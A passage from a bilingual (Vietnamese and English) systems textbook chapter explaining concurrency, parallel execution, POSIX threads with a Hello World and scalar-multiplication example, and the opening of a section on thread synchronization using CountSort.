<p><strong>Hình 1.</strong> Trình tự thời gian thực thi của năm process khi chúng chia sẻ một CPU lõi đơn</p>
<p>Trục ngang là thời gian, với mỗi <strong>time slice</strong> (lát thời gian) tương ứng một đơn vị thời gian.<br />
Một ô vuông biểu thị thời điểm một process đang sử dụng CPU lõi đơn.<br />
Giả sử mỗi process thực thi trọn một time slice trước khi xảy ra context switch.<br />
Ví dụ, <strong>Process 1</strong> sử dụng CPU tại các bước thời gian T1 và T3.</p>
<p>Trong ví dụ này, thứ tự thực thi process là:<br />
P1, P2, P1, P2, P4, P2, P3, P4, P5, P3, P5.</p>
<p>Tại đây, ta phân biệt giữa hai khái niệm về thời gian:</p>
<ul>
<li><strong>CPU time</strong>: lượng thời gian một process thực sự chạy trên CPU.</li>
<li><strong>Wall-clock time</strong>: lượng thời gian mà con người cảm nhận process cần để hoàn thành.</li>
</ul>
<p>Wall-clock time thường <strong>lớn hơn nhiều</strong> so với CPU time, do có context switch.<br />
Ví dụ, CPU time của Process 1 là 2 đơn vị thời gian, nhưng wall-clock time của nó là 3 đơn vị thời gian.</p>
<p>Khi tổng thời gian thực thi của một process <strong>chồng lấn</strong> với process khác, các process đó đang chạy <strong>concurrently</strong> (đồng thời).<br />
Trong thời kỳ CPU lõi đơn, OS sử dụng concurrency để tạo <strong>ảo giác</strong> rằng máy tính có thể thực hiện nhiều việc cùng lúc<br />
(ví dụ: bạn có thể mở đồng thời chương trình máy tính bỏ túi, trình duyệt web và tài liệu soạn thảo văn bản).<br />
Thực tế, mỗi process vẫn thực thi <strong>tuần tự</strong>, và OS quyết định <a href="C14-SharedMemory/../C13-OS/processes.html#_multiprogramming_and_context_switching">thứ tự thực thi và hoàn thành của các process</a> (thứ tự này có thể khác nhau ở mỗi lần chạy).</p>
<p>Quay lại ví dụ, ta thấy:</p>
<ul>
<li>Process 1 và Process 2 chạy <strong>concurrently</strong> vì thời gian thực thi của chúng chồng lấn tại T2–T4.</li>
<li>Process 2 và Process 4 cũng chạy concurrently (T4–T6).</li>
<li>Ngược lại, Process 2 <strong>không</strong> chạy concurrently với Process 3, vì chúng không có khoảng thời gian thực thi trùng nhau; Process 3 chỉ bắt đầu tại T7, trong khi Process 2 kết thúc ở T6.</li>
</ul>
<p>Một CPU đa lõi cho phép OS lập lịch <strong>một process khác nhau</strong> cho <strong>mỗi core</strong> khả dụng, cho phép các process thực thi <strong>simultaneously</strong> (đồng thời thực sự).<br />
Việc thực thi đồng thời các lệnh từ các process chạy trên nhiều core được gọi là <strong>parallel execution</strong> (thực thi song song).</p>
<p><strong>Hình 2</strong> cho thấy cách các process ví dụ có thể thực thi trên hệ thống <strong>dual-core</strong> (2 lõi).</p>
<p><img src="C14-SharedMemory/_images/concurrency_2.png" alt="parallel example with 2 cores" /></p>
<p><strong>Hình 2.</strong> Trình tự thời gian thực thi của năm process, mở rộng để bao gồm hai CPU core (một lõi màu xanh đậm, một lõi màu xanh nhạt)</p>
<p>Trong ví dụ này, hai CPU core được tô màu khác nhau.<br />
Giả sử thứ tự thực thi process vẫn là:<br />
P1, P2, P1, P2, P4, P2, P3, P4, P5, P3, P5.</p>
<p>Sự xuất hiện của nhiều core cho phép một số process <strong>thực thi sớm hơn</strong>.<br />
Ví dụ:</p>
<ul>
<li>Tại T1: Core 1 chạy Process 1, Core 2 chạy Process 2.</li>
<li>Tại T2: Core 1 chạy Process 2, Core 2 chạy Process 1.</li>
</ul>
<p>Kết quả: Process 1 hoàn tất sau T2, trong khi Process 2 hoàn tất tại T3.</p>
<p>Lưu ý: <strong>Parallel execution</strong> chỉ làm tăng <strong>số lượng process</strong> có thể chạy tại một thời điểm.<br />
Trong <strong>Hình 2</strong>, tất cả process hoàn tất tại T7.<br />
Tuy nhiên, <strong>mỗi process riêng lẻ</strong> vẫn cần cùng một lượng CPU time như trong <strong>Hình 1</strong>.<br />
Ví dụ: Process 2 cần 3 đơn vị thời gian CPU, bất kể chạy trên hệ thống lõi đơn hay đa lõi (tức là <em>CPU time</em> không đổi).</p>
<p>CPU đa lõi giúp tăng <strong>throughput</strong> (thông lượng) của việc thực thi process — tức là số lượng process có thể hoàn thành trong một khoảng thời gian nhất định.<br />
Vì vậy, mặc dù CPU time của từng process không thay đổi, <strong>wall-clock time</strong> của nó có thể giảm.</p>
<h3 id="1412-tăng-tốc-thực-thi-process-bằng-threads"><a class="header" href="#1412-tăng-tốc-thực-thi-process-bằng-threads">14.1.2. Tăng tốc thực thi process bằng Threads</a></h3>
<p>Một cách để tăng tốc thực thi của một process đơn là <strong>phân rã</strong> nó thành các luồng thực thi nhẹ, độc lập gọi là <strong>thread</strong>.<br />
<strong>Hình 3</strong> cho thấy cách <strong>virtual address space</strong> (không gian địa chỉ ảo) của một process thay đổi khi nó được <strong>multithreaded</strong> (đa luồng) với hai thread.<br />
Mỗi thread có <strong>call stack</strong> (ngăn xếp lời gọi hàm) riêng, nhưng tất cả các thread <strong>chia sẻ</strong> dữ liệu chương trình, lệnh, và vùng heap được cấp phát cho process đa luồng.</p>
<p><img src="C14-SharedMemory/_images/multithread-vas.png" alt="multithread process with 2 threads" /></p>
<p><strong>Hình 3.</strong> So sánh không gian địa chỉ ảo của process đơn luồng và process đa luồng với hai thread</p>
<p>Hệ điều hành lập lịch (schedule) các thread tương tự như cách nó lập lịch các process.<br />
Trên một <strong>multicore processor</strong> (bộ xử lý đa lõi), OS có thể tăng tốc thực thi của chương trình đa luồng bằng cách lập lịch cho các thread khác nhau chạy trên các core riêng biệt.<br />
Số lượng thread tối đa có thể thực thi song song bằng với số lượng <strong>physical core</strong> (lõi vật lý) trên hệ thống.<br />
Nếu số lượng thread vượt quá số lượng physical core, các thread còn lại phải <strong>chờ đến lượt</strong> để thực thi (tương tự như cách các process chạy trên một core đơn).</p>
<h4 id="ví-dụ-nhân-vô-hướng-scalar-multiplication"><a class="header" href="#ví-dụ-nhân-vô-hướng-scalar-multiplication">Ví dụ: Nhân vô hướng (Scalar Multiplication)</a></h4>
<p>Ví dụ ban đầu về cách sử dụng multithreading để tăng tốc ứng dụng:<br />
Xét bài toán nhân vô hướng một mảng <code>array</code> với một số nguyên <code>s</code>.<br />
Trong phép nhân vô hướng, mỗi phần tử của mảng được nhân với <code>s</code>.</p>
<p>Một cài đặt <strong>tuần tự</strong> của hàm nhân vô hướng như sau:</p>
<pre><code class="language-c">void scalar_multiply(int * array, long length, int s) {
    int i;
    for (i = 0; i &lt; length; i++) {
      array[i] = array[i] * s;
    }
}
</code></pre>
<p>Giả sử <code>array</code> có tổng cộng <em>N</em> phần tử.<br />
Để tạo phiên bản đa luồng với <em>t</em> thread, cần:</p>
<ol>
<li>Tạo <em>t</em> thread.</li>
<li>Gán cho mỗi thread một <strong>phần con</strong> của mảng đầu vào (tức là <em>N</em>/<em>t</em> phần tử).</li>
<li>Yêu cầu mỗi thread nhân các phần tử trong phần mảng của nó với <code>s</code>.</li>
</ol>
<p>Giả sử phiên bản tuần tự của <code>scalar_multiply</code> mất <strong>60 giây</strong> để nhân một mảng 100 triệu phần tử.<br />
Để xây dựng phiên bản chạy với <em>t</em> = 4 thread, ta gán cho mỗi thread <strong>1/4</strong> mảng đầu vào (25 triệu phần tử).</p>
<p><strong>Hình 4</strong> cho thấy điều gì xảy ra khi chạy 4 thread trên <strong>một core</strong>.<br />
Như trước, thứ tự thực thi do OS quyết định.<br />
Giả sử thứ tự thực thi thread là: Thread 1, Thread 3, Thread 2, Thread 4.<br />
Trên CPU lõi đơn (biểu diễn bằng các ô vuông), mỗi thread chạy <strong>tuần tự</strong>.<br />
Do đó, process đa luồng chạy trên một core vẫn mất <strong>60 giây</strong> (thậm chí lâu hơn một chút do overhead tạo thread).</p>
<p><img src="C14-SharedMemory/_images/single-core-thread.png" alt="multithreaded process on one core" /></p>
<p><strong>Hình 4.</strong> Chạy bốn thread trên CPU lõi đơn</p>
<p>Bây giờ giả sử chạy process đa luồng trên hệ thống <strong>dual-core</strong>.<br />
<strong>Hình 5</strong> cho thấy kết quả.<br />
Vẫn với <em>t</em> = 4 thread và thứ tự thực thi: Thread 1, Thread 3, Thread 2, Thread 4.<br />
Hai core được biểu diễn bằng các ô vuông có màu khác nhau.</p>
<ul>
<li>Tại T1: Thread 1 và Thread 3 chạy song song.</li>
<li>Tại T2: Thread 2 và Thread 4 chạy song song.</li>
</ul>
<p>Kết quả: process đa luồng vốn mất 60 giây giờ chỉ mất <strong>30 giây</strong>.</p>
<p><img src="C14-SharedMemory/_images/dual-core-thread.png" alt="multithreaded process on two cores" /></p>
<p><strong>Hình 5.</strong> Chạy bốn thread trên CPU hai lõi</p>
<p>Cuối cùng, giả sử process đa luồng (<em>t</em> = 4) chạy trên CPU <strong>quad-core</strong> (4 lõi).<br />
<strong>Hình 6</strong> minh họa một trình tự thực thi như vậy.<br />
Mỗi core trong hình được tô màu khác nhau.</p>
<ul>
<li>Tại T1: Cả 4 thread chạy song song.</li>
</ul>
<p>Kết quả: process đa luồng vốn mất 60 giây giờ chỉ mất <strong>15 giây</strong>.</p>
<p><img src="C14-SharedMemory/_images/quad-core-thread.png" alt="multithreaded process on four cores" /></p>
<p><strong>Hình 6.</strong> Chạy bốn thread trên CPU bốn lõi</p>
<p>Nhìn chung, nếu số lượng thread bằng số lượng core (<em>c</em>) và OS lập lịch để mỗi thread chạy song song trên một core riêng, thì process đa luồng sẽ chạy trong khoảng <strong>1/<em>c</em></strong> thời gian.<br />
Đây là <strong>linear speedup</strong> (tăng tốc tuyến tính) lý tưởng, nhưng hiếm khi đạt được trong thực tế.</p>
<p>Ví dụ: nếu có nhiều process khác (hoặc process đa luồng khác) đang chờ CPU, tất cả sẽ cạnh tranh cho số core hạn chế, dẫn đến <strong>resource contention</strong> (tranh chấp tài nguyên).<br />
Nếu số thread vượt quá số core CPU, mỗi thread phải chờ đến lượt.</p>
<p>Chúng ta sẽ tìm hiểu các yếu tố khác thường ngăn cản việc đạt được linear speedup <a href="C14-SharedMemory/performance.html#_measuring_the_performance_of_parallel_programs">ở phần sau của chương này</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="142-hello-threading-writing-your-first-multithreaded-program"><a class="header" href="#142-hello-threading-writing-your-first-multithreaded-program">14.2. Hello Threading! Writing Your First Multithreaded Program</a></h2>
<p>In this section, we examine the ubiquitous POSIX thread library
<strong>Pthreads</strong>. POSIX is an acronym for Portable Operating System
Interface. It is an IEEE standard that specifies how UNIX systems look,
act, and feel. The POSIX threads API is available on almost all
UNIX-like operating systems, each of which meets the standard in its
entirety or to some great degree. So, if you write parallel code using
POSIX threads on a Linux machine, it will certainly work on other Linux
machines, and it will likely work on machines running macOS or other
UNIX variants.</p>
<p>Let's begin by analyzing an example &quot;Hello World&quot; Pthreads program
(<a href="C14-SharedMemory/_attachments/hellothreads.c">hellothreads.c</a>). For brevity, we have
excluded error handling in the listing, though the <a href="C14-SharedMemory/_attachments/hellothreads.c">downloadable
version</a> contains sample error handling.</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;

/* The &quot;thread function&quot; passed to pthread_create.  Each thread executes this
 * function and terminates when it returns from this function. */
void *HelloWorld(void *id) {

    /* We know the argument is a pointer to a long, so we cast it from a
     * generic (void *) to a (long *). */
    long *myid = (long *) id;

    printf(&quot;Hello world! I am thread %ld\n&quot;, *myid);

    return NULL; // We don't need our threads to return anything.
}

int main(int argc, char **argv) {
    int i;
    int nthreads; //number of threads
    pthread_t *thread_array; //pointer to future thread array
    long *thread_ids;

    // Read the number of threads to create from the command line.
    if (argc !=2) {
        fprintf(stderr, &quot;usage: %s &lt;n&gt;\n&quot;, argv[0]);
        fprintf(stderr, &quot;where &lt;n&gt; is the number of threads\n&quot;);
        return 1;
    }
    nthreads = strtol(argv[1], NULL, 10);

    // Allocate space for thread structs and identifiers.
    thread_array = malloc(nthreads * sizeof(pthread_t));
    thread_ids = malloc(nthreads * sizeof(long));

    // Assign each thread an ID and create all the threads.
    for (i = 0; i &lt; nthreads; i++) {
        thread_ids[i] = i;
        pthread_create(&amp;thread_array[i], NULL, HelloWorld, &amp;thread_ids[i]);
    }

    /* Join all the threads. Main will pause in this loop until all threads
     * have returned from the thread function. */
    for (i = 0; i &lt; nthreads; i++) {
        pthread_join(thread_array[i], NULL);
    }

    free(thread_array);
    free(thread_ids);

    return 0;
}
</code></pre>
<p>Let's examine this program in smaller components.</p>
<ul>
<li>
<p>Notice the inclusion of the <code>pthread.h</code> header file, which declares
<code>pthread</code> types and functions.</p>
</li>
<li>
<p>Next, the <code>HelloWorld</code> function defines the <strong>thread function</strong> that
we later pass to <code>pthread_create</code>. A thread function is analogous to
a <code>main</code> function for a worker (created) thread --- a thread begins
execution at the start of its thread function and terminates when it
reaches the end. Each thread executes the thread function using its
private execution state (i.e., its own stack memory and register
values). Note also that the thread function is of type <code>void*</code>.
Specifying an <a href="C14-SharedMemory/../C2-C_depth/advanced_voidstar.html#_c_voidstar_recasting_"><strong>anonymous
pointer</strong></a>
in this context allows programmers to write thread functions that
deal with arguments and return values of different types.</p>
</li>
<li>
<p>Lastly, in the <code>main</code> function, the main thread initializes the
program state before creating and joining the worker threads.</p>
</li>
</ul>
<h3 id="1421-creating-and-joining-threads"><a class="header" href="#1421-creating-and-joining-threads">14.2.1. Creating and Joining Threads</a></h3>
<p>The program first starts as a single-threaded process. As it executes
the <code>main</code> function, it reads the number of threads to create, and it
allocates memory for two arrays: <code>thread_array</code> and <code>thread_ids</code>. The
<code>thread_array</code> array contains the set of addresses for each thread
created. The <code>thread_ids</code> array stores the set of arguments that each
thread is passed. In this example, each thread is passed the address of
its rank (or ID, represented by <code>thread_ids[i]</code>).</p>
<p>After all the preliminary variables are allocated and initialized, the
<code>main</code> thread executes the two major steps of multithreading:</p>
<ul>
<li>
<p>The <strong>creation</strong> step, in which the main thread spawns one or more
worker threads. After being spawned, each worker thread runs within
its own execution context concurrently with the other threads and
processes on the system.</p>
</li>
<li>
<p>The <strong>join</strong> step, in which the main thread waits for all the
workers to complete before proceeding as a single-thread process.
Joining a thread that has terminated frees the thread's execution
context and resources. Attempting to join a thread that <em>hasn't</em>
terminated blocks the caller until the thread terminates, similar to
the semantics of the <a href="C14-SharedMemory/../C13-OS/processes.html#_exit_and_wait">wait function for
processes</a>.</p>
</li>
</ul>
<p>The Pthreads library offers a <code>pthread_create</code> function for creating
threads and a <code>pthread_join</code> function for joining them. The
<code>pthread_create</code> function has the following signature:</p>
<pre><code>pthread_create(pthread_t *thread, const pthread_attr_t *attr,
               void *thread_function, void *thread_args)
</code></pre>
<p>The function takes a pointer to a thread struct (of type <code>pthread_t</code>), a
pointer to an attribute struct (normally set to <code>NULL</code>), the name of the
function the thread should execute, and the array of arguments to pass
to the thread function when it starts.</p>
<p>The Hello World program calls <code>pthread_create</code> in the <code>main</code> function
using:</p>
<pre><code>pthread_create(&amp;thread_array[i], NULL, HelloWorld, &amp;thread_ids[i]);
</code></pre>
<p>Here:</p>
<ul>
<li>
<p><code>&amp;thread_array[i]</code> contains the address of thread <em>i</em>. The
<code>pthread_create</code> function allocates a <code>pthread_t</code> thread object and
stores its address at this location, enabling the programmer to
reference the thread later (e.g., when joining it).</p>
</li>
<li>
<p><code>NULL</code> specifies that the thread should be created with default
attributes. In most programs, it is safe to leave this second
parameter as <code>NULL</code>.</p>
</li>
<li>
<p><code>HelloWorld</code> names the thread function that the created thread
should execute. This function behaves like the &quot;main&quot; function for
the thread. For an arbitrary thread function (e.g., <code>function</code>), its
prototype must match the form <code>void * function(void *)</code>.</p>
</li>
<li>
<p><code>&amp;thread_ids[i]</code> specifies the address of the arguments to be passed
to thread <em>i</em>. In this case, <code>thread_ids[i]</code> contains a single
<code>long</code> representing the thread's ID. Since the last argument to
<code>pthread_create</code> must be a pointer, we pass the <em>address</em> of the
thread's ID.</p>
</li>
</ul>
<p>To generate several threads that execute the <code>HelloWorld</code> thread
function, the program assigns each thread a unique ID and creates each
thread within a <code>for</code> loop:</p>
<pre><code>for (i = 0; i &lt; nthreads; i++) {
    thread_ids[i] = i;
    pthread_create(&amp;thread_array[i], NULL, HelloWorld, &amp;thread_ids[i]);
}
</code></pre>
<p>The OS schedules the execution of each created thread; the user cannot
make any assumption on the order in which the threads will execute.</p>
<p>The <code>pthread_join</code> function suspends the execution of its caller until
the thread it references terminates. Its signature is:</p>
<pre><code>pthread_join(pthread_t thread, void **return_val)
</code></pre>
<p>The <code>pthread_join</code> takes as input a <code>pthread_t</code> struct, indicating which
thread to wait on, and an optional pointer argument that specifies where
the thread's return value should be stored.</p>
<p>The Hello World program calls <code>pthread_join</code> in <code>main</code> using:</p>
<pre><code>pthread_join(thread_array[t], NULL);
</code></pre>
<p>This line indicates that the main thread must wait on the termination of
thread <code>t</code>. Passing <code>NULL</code> as the second argument indicates that the
program does not use the thread's return value.</p>
<p>In the previous program, <code>main</code> calls <code>pthread_join</code> in a loop because
<em>all</em> of the worker threads need to terminate before the <code>main</code> function
proceeds to clean up memory and terminate the process:</p>
<pre><code>for (i = 0; i &lt; nthreads; i++) {
    pthread_join(thread_array[i], NULL);
}
</code></pre>
<h3 id="1422-the-thread-function"><a class="header" href="#1422-the-thread-function">14.2.2. The Thread Function</a></h3>
<p>In the previous program, each spawned thread prints out
<code>Hello world! I am thread n</code>, where <code>n</code> is the thread's unique id. After
the thread prints out its message, it terminates. Let's take a closer
look at the <code>HelloWorld</code> function:</p>
<pre><code>void *HelloWorld(void *id) {
    long *myid = (long*)id;

    printf(&quot;Hello world! I am thread %ld\n&quot;, *myid);

    return NULL;
}
</code></pre>
<p>Recall that <code>pthread_create</code> passes the arguments to the thread function
using the <code>thread_args</code> parameter. In the <code>pthread_create</code> function in
<code>main</code>, the Hello World program specified that this parameter is in fact
the thread's ID. Note that the parameter to <code>HelloWorld</code> must be
declared as a generic or <a href="C14-SharedMemory/../C2-C_depth/advanced_voidstar.html#_c_voidstar_recasting_">anonymous pointer
(<code>void *</code>)</a>.
The Pthreads library uses <code>void *</code> to make <code>pthread_create</code> more general
purpose by not prescribing a parameter type. As a programmer, the
<code>void *</code> is mildly inconvenient given that it must be recast before use.
Here, we <em>know</em> the parameter is of type <code>long *</code> because that's what we
passed to <code>pthread_create</code> in <code>main</code>. Thus, we can safely cast the value
as a <code>long *</code> and dereference the pointer to access the <code>long</code> value.
Many parallel programs follow this structure.</p>
<p>Similar to the thread function's parameter, the Pthreads library avoids
prescribing the thread function's return type by specifying another
<code>void *</code> --- the programmer is free to return any pointer from the
thread function. If the program needs to access the thread's return
value, it can retrieve it via the second argument to <code>pthread_join</code>. In
our example, the thread has no need to return a value, so it simply
returns a <code>NULL</code> pointer.</p>
<h3 id="1423-running-the-code"><a class="header" href="#1423-running-the-code">14.2.3. Running the Code</a></h3>
<p>The command that follows shows how to use GCC to compile
<a href="C14-SharedMemory/_attachments/hellothreads.c">hellothreads.c</a>. Building a Pthreads
application requires that the <code>-pthread</code> linker flag be passed to GCC to
ensure that the Pthreads functions and types are accessible:</p>
<pre><code>$ gcc -o hellothreads hellothreads.c -pthread
</code></pre>
<p>Running the program without a command line argument results in a usage
message:</p>
<pre><code>$ ./hellothreads
usage: ./hellothreads &lt;n&gt;
where &lt;n&gt; is the number of threads
</code></pre>
<p>Running the program with four threads yields the following output:</p>
<pre><code>$ ./hellothreads 4
Hello world! I am thread 1
Hello world! I am thread 2
Hello world! I am thread 3
Hello world! I am thread 0
</code></pre>
<p>Notice that each thread prints its unique ID number. In this run, thread
1's output displays first, followed by threads 2, 3, and 0. If we run
the program again, we may see the output displayed in a different order:</p>
<pre><code>$ ./hellothreads 4
Hello world! I am thread 0
Hello world! I am thread 1
Hello world! I am thread 2
Hello world! I am thread 3
</code></pre>
<p>Recall that the operating system's scheduler determines the thread
execution order. From a user's perspective, the order is <em>effectively
random</em> due to being influenced by many factors that vary outside the
user's control (e.g., available system resources, the system receiving
input, or OS scheduling). Since all threads are running concurrently
with one another and each thread executes a call to <code>printf</code> (which
prints to <code>stdout</code>), the first thread that prints to <code>stdout</code> will have
its output show up first. Subsequent executions may (or may not) result
in different output.</p>
<p>+-----------------------------------+-----------------------------------+
|                                   |                          |
|                                   | Thread Execution Order            |
|                                   | :::                               |
|                                   |                                   |
|                                   | ::: paragraph                     |
|                                   | You should <em>never</em> make any       |
|                                   | assumptions about the order in    |
|                                   | which threads will execute. If    |
|                                   | the correctness of your program   |
|                                   | requires that threads run in a    |
|                                   | particular order, you must add    |
|                                   | [<strong>sync                           |
|                                   | hronization</strong>](synchronization.ht |
|                                   | ml#_synchronizing_threads) |
|                                   | to your program to prevent        |
|                                   | threads from running when they    |
|                                   | shouldn't.                        |
|                                   | :::                               |
+-----------------------------------+-----------------------------------+</p>
<h3 id="1424-revisiting-scalar-multiplication"><a class="header" href="#1424-revisiting-scalar-multiplication">14.2.4. Revisiting Scalar Multiplication</a></h3>
<p>Let's explore how to create a multithreaded implementation of the
<a href="C14-SharedMemory/multicore.html#_an_example_scalar_multiplication">scalar
multiplication</a>
program from the previous section. Recall that our general strategy for
parallelizing <code>scalar_multiply</code> is to:</p>
<ol>
<li>
<p>Create multiple threads,</p>
</li>
<li>
<p>Assign each thread a subset of the input array,</p>
</li>
<li>
<p>Instruct each thread to multiply the elements in its array subset by
<code>s</code>.</p>
</li>
</ol>
<p>The following is a thread function that accomplishes this task. Notice
that we have moved <code>array</code>, <code>length</code>, and <code>s</code> to the global scope of the
program.</p>
<pre><code>long *array; //allocated in main
long length; //set in main (1 billion)
long nthreads; //number of threads
long s; //scalar

void *scalar_multiply(void *id) {
    long *myid = (long *) id;
    int i;

    //assign each thread its own chunk of elements to process
    long chunk = length / nthreads;
    long start = *myid * chunk;
    long end  = start + chunk;
    if (*myid == nthreads - 1) {
        end = length;
    }

    //perform scalar multiplication on assigned chunk
    for (i = start; i &lt; end; i++) {
        array[i] *= s;
    }

    return NULL;
}
</code></pre>
<p>Let's break this down into parts. Recall that the first step is to
assign each thread a component of the array. The following lines
accomplish this task:</p>
<pre><code>long chunk = length / nthreads;
long start = *myid * chunk;
long end  = start + chunk;
</code></pre>
<p>The variable <code>chunk</code> stores the number of elements that each thread is
assigned. To ensure that each thread gets roughly the same amount of
work, we first set the chunk size to the number of elements divided by
the number of threads, or <code>length / nthreads</code>.</p>
<p>Next, we assign each thread a distinct range of elements to process.
Each thread computes its range's <code>start</code> and <code>end</code> index using the
<code>chunk</code> size and its unique thread ID.</p>
<p>For example, with four threads (with IDs 0-3) operating over an array
with 100 million elements, each thread is responsible for processing a
25 million element <code>chunk</code>. Incorporating the thread ID assigns each
thread a unique subset of the input.</p>
<p>The next two lines account for the case in which <code>length</code> is not evenly
divisible by the number of threads:</p>
<pre><code>if (*myid == nthreads - 1) {
    end = length;
}
</code></pre>
<p>Suppose that we specified three rather than four threads. The nominal
chunk size would be 33,333,333 elements, leaving one element unaccounted
for. The code in the previous example would assign the remaining element
to the last thread.</p>
<p>+-----------------------------------+-----------------------------------+
|                                   |                          |
|                                   | Creating balanced input           |
|                                   | :::                               |
|                                   |                                   |
|                                   | ::: paragraph                     |
|                                   | The chunking code just shown is   |
|                                   | imperfect. In the case where the  |
|                                   | number of threads does not evenly |
|                                   | divide the input, the remainder   |
|                                   | is assigned to the last thread.   |
|                                   | Consider a sample run in which    |
|                                   | the array has 100 elements, and   |
|                                   | 12 threads are specified. The     |
|                                   | nominal chunk size would be 8,    |
|                                   | and the remainder would be 4.     |
|                                   | With the example code, the first  |
|                                   | 11 threads will each have 8       |
|                                   | assigned elements, whereas the    |
|                                   | last thread will be assigned 12   |
|                                   | elements. Consequently, the last  |
|                                   | thread performs 50% more work     |
|                                   | than the other threads. A         |
|                                   | potentially better way to chunk   |
|                                   | this example is to have the first |
|                                   | 4 threads process 9 elements      |
|                                   | each, while the last 8 threads    |
|                                   | process 8 elements each. This     |
|                                   | will result in better <strong>load      |
|                                   | balancing</strong> of the input across   |
|                                   | the threads.                      |
|                                   | :::                               |
+-----------------------------------+-----------------------------------+</p>
<p>With an appropriate local <code>start</code> and <code>end</code> index computed, each thread
is now ready to perform scalar multiplication on its component of the
array. The last portion of the <code>scalar_multiply</code> function accomplishes
this:</p>
<pre><code>for (i = start; i &lt; end; i++) {
    array[i] *= s;
}
</code></pre>
<h3 id="1425-improving-scalar-multiplication-multiple-arguments"><a class="header" href="#1425-improving-scalar-multiplication-multiple-arguments">14.2.5. Improving Scalar Multiplication: Multiple Arguments</a></h3>
<p>A key weakness of the previous implementation is the wide use of global
variables. Our original discussion of <a href="C14-SharedMemory/../C2-C_depth/scope_memory.html#_parts_of_program_memory_and_scope">global
variables</a>
showed that although useful, global variables should generally be
avoided in C. To reduce the number of global variables in the program,
one solution is to declare a <code>t_arg</code> struct as follows in the global
scope:</p>
<pre><code>struct t_arg {
    int *array; // pointer to shared array
    long length; // num elements in array
    long s; //scaling factor
    long numthreads; // total number of threads
    long id; //  logical thread id
};
</code></pre>
<p>Our main function would, in addition to allocating <code>array</code> and setting
local variables <code>length</code>, <code>nthreads</code>, and <code>s</code> (our scaling factor),
allocate an array of <code>t_arg</code> records:</p>
<pre><code>long nthreads = strtol(argv[1], NULL, 10); //get number of threads
long length = strtol(argv[2], NULL, 10); //get length of array
long s = strtol( argv[3], NULL, 10 ); //get scaling factor

int *array = malloc(length*sizeof(int));

//allocate space for thread structs and identifiers
pthread_t *thread_array = malloc(nthreads * sizeof(pthread_t));
struct t_arg *thread_args = malloc(nthreads * sizeof(struct t_arg));

//Populate thread arguments for all the threads
for (i = 0; i &lt; nthreads; i++){
    thread_args[i].array = array;
    thread_args[i].length = length;
    thread_args[i].s = s;
    thread_args[i].numthreads = nthreads;
    thread_args[i].id = i;
}
</code></pre>
<p>Later in <code>main</code>, when <code>pthread_create</code> is called, the thread's
associated <code>t_args</code> struct is passed as an argument:</p>
<pre><code>for (i = 0; i &lt; nthreads; i++){
    pthread_create(&amp;thread_array[i], NULL, scalar_multiply, &amp;thread_args[i]);
}
</code></pre>
<p>Lastly, our <code>scalar_multiply</code> function would look like the following:</p>
<pre><code>void * scalar_multiply(void* args) {
    //cast to a struct t_arg from void*
    struct t_arg * myargs = (struct t_arg *) args;

    //extract all variables from struct
    long myid =  myargs-&gt;id;
    long length = myargs-&gt;length;
    long s = myargs-&gt;s;
    long nthreads = myargs-&gt;numthreads;
    int * ap = myargs-&gt;array; //pointer to array in main

    //code as before
    long chunk = length/nthreads;
    long start = myid * chunk;
    long end  = start + chunk;
    if (myid == nthreads-1) {
        end = length;
    }

    int i;
    for (i = start; i &lt; end; i++) {
        ap[i] *= s;
    }

    return NULL;
}
</code></pre>
<p>Implementing this program fully is an exercise we leave to the reader.
Please note that error handling has been omitted for the sake of
brevity.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="143-Đồng-bộ-hóa-các-thread-synchronizing-threads"><a class="header" href="#143-Đồng-bộ-hóa-các-thread-synchronizing-threads">14.3. Đồng bộ hóa các Thread (Synchronizing Threads)</a></h2>
<p>Trong các ví dụ mà chúng ta đã xem cho đến nay, mỗi <strong>thread</strong> thực thi mà <strong>không chia sẻ dữ liệu</strong> với bất kỳ thread nào khác.<br />
Ví dụ, trong chương trình <strong>nhân vô hướng</strong> (scalar multiplication), mỗi phần tử của mảng hoàn toàn độc lập với các phần tử khác, nên không cần thiết để các thread chia sẻ dữ liệu.</p>
<p>Tuy nhiên, khả năng <strong>dễ dàng chia sẻ dữ liệu</strong> với các thread khác lại là một trong những đặc điểm chính của thread.<br />
Hãy nhớ rằng tất cả các thread của một <strong>process đa luồng</strong> (multithreaded process) đều <strong>chia sẻ vùng heap</strong> chung của process đó.<br />
Trong phần này, chúng ta sẽ nghiên cứu chi tiết các cơ chế chia sẻ và bảo vệ dữ liệu mà thread có thể sử dụng.</p>
<p><strong>Thread synchronization</strong> (đồng bộ hóa thread) đề cập đến việc <strong>ép</strong> các thread thực thi theo một <strong>thứ tự nhất định</strong>.<br />
Mặc dù việc đồng bộ hóa thread có thể làm tăng thời gian chạy của chương trình, nhưng nó thường <strong>cần thiết</strong> để đảm bảo <strong>tính đúng đắn</strong> của chương trình.</p>
<p>Trong phần này, chúng ta sẽ tập trung thảo luận cách một cấu trúc đồng bộ hóa — <strong>mutex</strong> — giúp đảm bảo tính đúng đắn của chương trình đa luồng.<br />
Chúng ta sẽ kết thúc phần này bằng việc thảo luận một số cấu trúc đồng bộ hóa phổ biến khác: <strong>semaphore</strong>, <strong>barrier</strong> và <strong>condition variable</strong>.</p>
<h3 id="countsort"><a class="header" href="#countsort">CountSort</a></h3>
<p>Hãy nghiên cứu một ví dụ phức tạp hơn một chút có tên <strong>CountSort</strong>.<br />
Thuật toán CountSort là một thuật toán sắp xếp tuyến tính đơn giản <strong>O(<em>N</em>)</strong> dùng để sắp xếp một tập giá trị nhỏ đã biết có kích thước <em>R</em>, trong đó <em>R</em> nhỏ hơn rất nhiều so với <em>N</em>.</p>
<p>Để minh họa cách CountSort hoạt động, hãy xét một mảng <code>A</code> gồm 15 phần tử, mỗi phần tử chứa giá trị ngẫu nhiên từ 0 đến 9 (tức có 10 giá trị khả dĩ):</p>
<pre><code>A = [9, 0, 2, 7, 9, 0, 1, 4, 2, 2, 4, 5, 0, 9, 1]
</code></pre>
<p>Với một mảng cụ thể, CountSort hoạt động như sau:</p>
<ol>
<li><strong>Đếm tần suất</strong> xuất hiện của mỗi giá trị trong mảng.</li>
<li><strong>Ghi đè</strong> mảng ban đầu bằng cách liệt kê mỗi giá trị theo đúng tần suất của nó.</li>
</ol>
